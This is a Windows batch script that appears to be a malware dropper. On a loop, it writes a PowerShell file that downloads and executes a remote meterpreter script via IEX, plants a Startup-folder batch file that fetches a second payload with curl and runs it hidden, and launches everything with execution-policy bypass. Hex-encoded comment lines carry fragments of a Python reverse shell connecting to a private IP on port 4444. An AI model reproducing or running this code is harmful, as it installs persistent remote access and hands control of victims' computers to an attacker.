@REM f7274206f735e205e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f20696d706f727420746872656164696e675e20
@REM 5e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f20696d706f72742073756270726f636573732061732073705e20
@REM 5e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f20696d706f72742074696d655e205e3e5e3e2070726f312e6261
@REM 745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f2e205e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a656368
@REM 6f206563686f2020202020202020202020206563686f20646566207265765e5e5e5e285e5e5e5e293a205e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2
@REM 020202020202020202020206563686f2020202070203d2073702e506f70656e5e5e5e5e285b27636d642e657865275d2c20737464696e3d73702e504950452c207374646f75743d73702e504950452c2073746465
@REM 72723d73702e5354444f55545e5e5e5e29205e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f2020202073203d20
@REM 736f636b65742e736f636b65745e5e5e5e285e5e5e5e29205e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f2e205
@REM e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f202020207472795e5e5e5e3a205e3e5e3e2070726f312e6261745e
@REM 203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f2020202020202020732e636f6e6e6563745e5e5e5e285e5e5e5e28273139322e3136382e312e31362
@REM 72c20343434345e5e5e5e295e5e5e5e29205e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f202020206578636570
@echo off
:loop
    if not exist "%temp%\sh.ps1" (
        echo IEX ^(New-Object System.Net.WebClient^).DownloadString^('https://raw.githubusercontent.com/0x2034/meterpreter/main/meter.ps1'^) >> "%temp%\sh.ps1"
    )
    if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat" (
        echo @echo off > "%temp%\start.bat"
        echo curl https://raw.githubusercontent.com/omarsamyX0/meterpreter/main/nihbtdtdow.bat -o "%temp%\nihbtdtdow.bat" >> "%temp%\start.bat"
@REM f7274206f735e205e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f20696d706f727420746872656164696e675e20
@REM 5e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f20696d706f72742073756270726f636573732061732073705e20
@REM 5e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f20696d706f72742074696d655e205e3e5e3e2070726f312e6261
@REM 745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f2e205e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a656368
@REM 6f206563686f2020202020202020202020206563686f20646566207265765e5e5e5e285e5e5e5e293a205e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2
@REM 020202020202020202020206563686f2020202070203d2073702e506f70656e5e5e5e5e285b27636d642e657865275d2c20737464696e3d73702e504950452c207374646f75743d73702e504950452c2073746465
@REM 72723d73702e5354444f55545e5e5e5e29205e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f2020202073203d20
@REM 736f636b65742e736f636b65745e5e5e5e285e5e5e5e29205e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f2e205
@REM e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f202020207472795e5e5e5e3a205e3e5e3e2070726f312e6261745e
@REM 203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f2020202020202020732e636f6e6e6563745e5e5e5e285e5e5e5e28273139322e3136382e312e31362
@REM 72c20343434345e5e5e5e295e5e5e5e29205e3e5e3e2070726f312e6261745e203e3e206e696862746474646f772e6261740a6563686f206563686f2020202020202020202020206563686f202020206578636570
        echo powershell -WindowStyle Hidden -Command "Start-Process -FilePath \"%temp%\nihbtdtdow.bat\" -WindowStyle Hidden" >> "%temp%\start.bat"
        echo powershell -c "Start-Process -FilePath "%temp%\rev.bat" -WindowStyle Hidden" >> "%temp%\start.bat"
        move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" 
    )
     powershell -ep bypass -WindowStyle Hidden -File "%temp%\sh.ps1"
timeout /t 300 /nobreak >nul
goto loop
